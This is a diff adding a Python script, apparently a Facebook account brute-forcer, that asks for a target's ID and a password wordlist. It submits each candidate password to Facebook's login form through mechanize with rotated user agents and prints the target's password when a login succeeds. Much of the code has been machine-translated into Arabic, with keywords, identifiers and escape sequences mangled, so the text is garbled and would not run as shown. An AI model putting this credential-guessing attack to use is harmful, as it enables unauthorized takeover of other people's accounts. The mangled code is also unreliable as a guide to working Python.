@@ -1,0 +1,183 @@
+
+استيراد  نظام التشغيل
+استيراد  النظم
+ وقت الاستيراد
+استيراد  عشوائي
+استيراد  ملفات تعريف الارتباط
+استيراد  الميكنة
+
+wd  =  " \ 033 [90 ؛ 1 متر"  # مظلم
+GL  =  " \ 033 [96 ؛ 1 متر"  # أزرق مائي
+BB  =  " \ 033 [34 ؛ 1 م"  # ضوء أزرق
+YY  =  " \ 033 [33 ؛ 1 متر"  # ضوء أصفر
+GG  =  " \ 033 [32 ؛ 1 متر"  # ضوء أخضر
+WW  =  " \ 033 [0 ؛ 1 م"   # ضوء أبيض
+RR  =  " \ 033 [31؛ 1m"  # ضوء أحمر
+CC  =  " \ 033 [36 ؛ 1 م"  # ضوء سماوي
+ب  =  " \ 033 [34 م"     # أزرق
+ص  =  " \ 033 [33 ؛ 1 متر"     # أصفر
+G  =  " \ 033 [32m"     # أخضر
+W  =  " \ 033 [0 ؛ 1 م"      # أبيض
+R  =  " \ 033 [31m"     # أحمر
+C  =  " \ 033 [36 ؛ 1 متر"     # سماوي
+
+ runntxt def : _ _
+        من أجل  noobs  في  s  +  ' \ n ' :
+                sys . stdout . الكتابة ( نوبس )
+                sys . stdout . تدفق ()
+                الوقت . النوم ( 10.  /  2100 )
+
+
+ بانر def ():
+    نظام التشغيل . نظام ( "واضح" )
+    طباعة  ""
+    runntxt ( GL + "Assalamu '@ laikum. ^ _ ^" )
+    runntxt ( WW + ".................. ANDA MENCOBA MENGHUBUNGI" )
+    runntxt ( WW + ".... MR.K7C8NG" )
+    runntxt ( GL + "BODO AMAT CUK" )
+    runntxt ( GG + ".......... MANDI DULU SANA" )
+    runntxt ( Y + "............ DILARANG CO * I" )
+    runntxt ( GG + "INGAT COK" )
+    الوقت . النوم ( 1.5 )
+    طباعة  GG + "√ ============================================= √ "
+    طباعة  GL + "| •••••• أدوات جديدة HACK FACEBOOK BF. •••••• |"
+    طباعة  GG + "√ ============================================= √ "
+    طباعة  WW + "| MOD BY: MR.K7C8NG |"
+    طباعة  GL + "| Berdoa Dulu Sebelum Menggunakan |"
+    طباعة  WW + "| فريق: InDoNeSiA CYBER ErRoR SyStEm |"
+    طباعة  Y + "| INSTAGRAM: pranata_pasha |"
+    طباعة  GL + "| --------------------------------------------- | "
+    طباعة  GL + "| LIFE OF PROGRAMMER [LOP] |"
+    طباعة  GL + "| --------------------------------------------- | "
+    طباعة  GG + "√ ============================================= √ "
+    طباعة  GL + "| ••••••••• HACK FACEBOOK MAS ^ _ ^ ••••••••• |"
+    طباعة  GG + "√ ============================================= √ "
+
+بانر ()
+
+طباعة  wd + "gunakan dengan bijak cok"
+طباعة  GG + "╭──── \ 033 [91m [ \ 033 [96m Masukkan ID \ 033 [95m / \ 033 [96mUsername Target \ 033 [91m]]"
+email_target  =  str ( raw_input ( GL + " \ 033 [92m╰────➲ \ 033 [93m " ))
+طباعة  ""
+طباعة  " \ 033 [92m╭──── \ 033 [91m [ \ 033 [96mMasukkan File Wordlist \ 033 [95m (pass.txt) \ 033 [91؛ 1m]")
+password_list  =  str ( raw_input ( GG + "╰────➲ \ 033 [93m" ))
+تسجيل الدخول  =  'https://www.facebook.com/login.php؟login_attempt=1'
+useragents  = [( 'Mozilla / 5.0 (X11؛ Linux x86_64؛ rv: 45.0) Gecko / 20100101 Firefox / 45.0' ، 'Mozilla / 5.0 (X11؛ U؛ Linux i686؛ en-US؛ rv: 1.9.0.1) Geck' )]
+# useragents = [('Mozilla / 5.0 (Windows NT 10.0؛ Win64؛ x64) AppleWebKit / 537.36 (KHTML ، مثل Gecko) Chrome / 60.0.3112.113 Safari / 537.36' ، 'Mozilla / 5.0 (Windows NT 6.1 ؛ Win64 ؛ x64) AppleWebKit / 537.36 (KHTML ، مثل Gecko) Chrome / 60.0.3112.90 Safari / 537.36 '،' Mozilla / 5.0 (Windows NT 5.1؛ Win64؛ x64) AppleWebKit / 537.36 (KHTML ، مثل Gecko) Chrome / 60.0.3112.90 Safari / 537.36 ' ، 'Mozilla / 5.0 (Windows NT 6.2؛ Win64؛ x64) AppleWebKit / 537.36 (KHTML ، مثل Gecko) Chrome / 60.0.3112.90 Safari / 537.36'، 'Mozilla / 5.0 (X11؛ Linux x86_64) AppleWebKit / 537.36 (KHTML ، مثل Gecko) Chrome / 44.0.2403.157 Safari / 537.36 '،' Mozilla / 5.0 (Windows NT 6.3؛ Win64؛ x64) AppleWebKit / 537.36 (KHTML ، مثل Gecko) Chrome / 60.0.3112.113 Safari / 537.36 '،' Mozilla / 5.0 (Windows NT 10.0؛ Win64؛ x64) AppleWebKit / 537.36 (KHTML ، مثل Gecko) Chrome / 57.0.2987.133 Safari / 537.36 '،' Mozilla / 5.0 (Windows NT 6.1؛ Win64؛ x64) AppleWebKit / 537.36 (KHTML، مثل Gecko) Chrome / 57.0.2987.133 Safari / 537.36 '،' Mozilla / 5.0 (Windows NT 10.0؛ Win64؛ x64 ) AppleWebKit / 537.36 (KHTML ، مثل Gecko) Chrome / 55.0.2883.87 Safari / 537.36 '،' Mozilla / 5.0 (Windows NT 6.1؛ Win64؛ x64) AppleWebKit / 537.36 (KHTML ، مثل Gecko) Chrome / 55.0.2883.87 Safari / 537.36 '،)]
+
+def  بيل ():
+                طباعة  GG + ""
+                g  =  str ( raw_input ( "[؟] Hack Fb lagi .. \ 033 [93؛ 1m [y / n]:" ))
+                إذا كانت  g  ==  'y'  أو  g  ==  'Y' :
+                    نظام التشغيل . النظام ( 'python2 brute.py' )
+                elif  g  ==  'n'  أو  g  ==  'N' :
+                    print  wd + "برنامج Keluar dari ..."
+                    sys . خروج ()
+                آخر :
+                    طباعة  RR + "Pilih yang bener cuk ..."
+                    بيل ()
+
+def  edit_wordlist ():
+
+        طباعة  GG + ""
+        ed  =  str ( raw_input ( "[؟] تحرير قائمة الكلمات cuk.؟ \ 033 [96؛ 1m [y / n]:" ))
+        إذا كانت  ed  ==  'y'  أو  ed  ==  'Y' :
+                نظام التشغيل . النظام ( 'nano' + password_list )
+                بيل ()
+        elif  ed  ==  'n'  أو  ed  ==  'N' :
+                print  wd + "برنامج Keluar Dari ..."
+                sys . خروج ()
+
+        آخر :
+                طباعة  RR + "Pilih yg bener cuk ..."
+                تحرير_قائمة الكلمات ()
+
+def  main ():
+         noobs العالمية
+        نوبس  =  ميكن . المتصفح ()
+        cj  =  cookielib . LWPCookieJar ()
+        نوبس . set_handle_robots ( خطأ )
+        نوبس . set_handle_redirect ( صواب )
+        نوبس . set_cookiejar ( cj )
+        نوبس . set_handle_equiv ( صواب )
+        نوبس . set_handle_referer ( صواب )
+        نوبس . set_handle_refresh ( ميكانيكي . _http . HTTPRefreshProcessor () ، max_time = 1 )
+        runn_noobs ()
+        الحياة ()
+        طباعة  ""
+        طباعة  RR + "قائمة الكلمات tidak ada yg cocok ..."
+        طباعة  ""
+def  iqbalz ( iqbalz_password ):
+  جرب :
+ 	sys . stdout . اكتب ( GG + " \ n [ \ 033 [91m + \ 033 [92m] \ 033 [91؛ 1m [ \ 033 [97m" + email_target + " \ 033 [91m] \ 033 [90m Mencoba ==> \ 033 [91m [ \ 033 [90؛ 1m " + iqbalz_password )
+	sys . stdout . تدفق ()
+	نوبس . addheaders  = [( " وكيل المستخدم" ، اختيار عشوائي ( وكلاء المستخدم ))]
+	site  =  noobs . فتح ( تسجيل الدخول )
+	نوبس . select_form ( نر  =  0 )
+	نوبس . شكل [ 'email' ] =  email_target
+	نوبس . شكل [ 'pass' ] =  iqbalz_password
+	توم  =  نوبس . إرسال ()
+	قناع  =  توم . geturl ()
+	if  mask  ! =  تسجيل الدخول  و ( ليس  "login_attempt"  في  القناع ):
+                        طباعة  ""
+			طباعة ( " \ 033 [96m SUCCES S" )
+			اطبع  "PASSWORDFIND"
+                  	طباعة  RR + "+ ------------------------------------------- +"
+	         	طباعة ( RR + "# \ 033 [97m ID / Email Target: \ 033 [92m {}" ). تنسيق ( email_target )
+        	        طباعة ( RR + "# \ 033 [97m كلمة المرور الهدف: \ 033 [92m {}" ). تنسيق ( iqbalz_password )
+        	        طباعة  ""
+        	        raw_input ( WW + "TEKAN ENTER UNTUK KELUAR ..." )
+			sys . مخرج ( 1 )
+  
+  
+  باستثناء  لوحة المفاتيح المقاطعة :
+      طباعة  wd + "إيقاف ......."
+      تحرير_قائمة الكلمات ()
+      sys . خروج ()    	    
+ الحياة def ():
+	 iqbalz_password العالمي
+	password_nob  =  مفتوح ( password_list ، "r" )
+	لـ  iqbalz_password  في  password_nob :
+		password_nob  =  iqbalz_password . استبدل ( " \ n " ، "" )
+		iqbalz ( iqbalz_password )		
+
+def  runn_noobs ():
+          قائمة_كلمات المرور العالمية
+
+         lop  =  GG + "" "
+                  `.-: //////: -.`
+              .: + o +: - .. "" "..-: + o + :.
+           `: o + -``: + o: `
+         `/ o:` `: o /`
+        -s / `.- ..` ..-- `` / s-
+       / س. `: .` .-: ----------: -.`: - .o /
+      / o`.: `-` o /
+     -س. .: `- .s-
+     o /.: `- + o
+    .س- :. `:" -s`
+    .س. :. `:` .s.
+    .s- -.: -s.
+     س / `-. "-. / س
+     -س. `--``.-`. s-
+      / o` ---- `..-- ..` ...--. `س /
+       / س. "----" -. "-. .o /
+        -o: -...... .. `: o-
+         `: o:` ...-- .. `: o:`
+           `: +/-` `- ..` - / +: `
+              "- / + /// ..` `` ..: // + / - `
+                  `.- :: //// :: -.` \ 033 [91 ؛ 1 م
+                \ 033 [90؛ 1m حياة مبرمج \ 033 [91؛ 1m
+             مدعوم من: \ 033 [97 م MR.K7C8NG
+      ""
+
+
+         طباعة  لوب
+         nuub  =  مفتوح ( password_list ، 'r' )
+         nuub  =  nuub . readlines ()
+         print  wd + "[#] ID / Username Target \ 033 [97؛ 1m: {}" . تنسيق ( email_target )
+         print  wd + "[#] JUmlah Password saat ini \ 033 [97؛ 1m:" ، len ( nuub )، 'password'
+         print  wd + "[#] Tunggu Proses Cracking \ 033 [97؛ 1m .........."
+         طباعة  ""
+
+إذا  __name__ == '__main__' :
+	رئيسي ()	
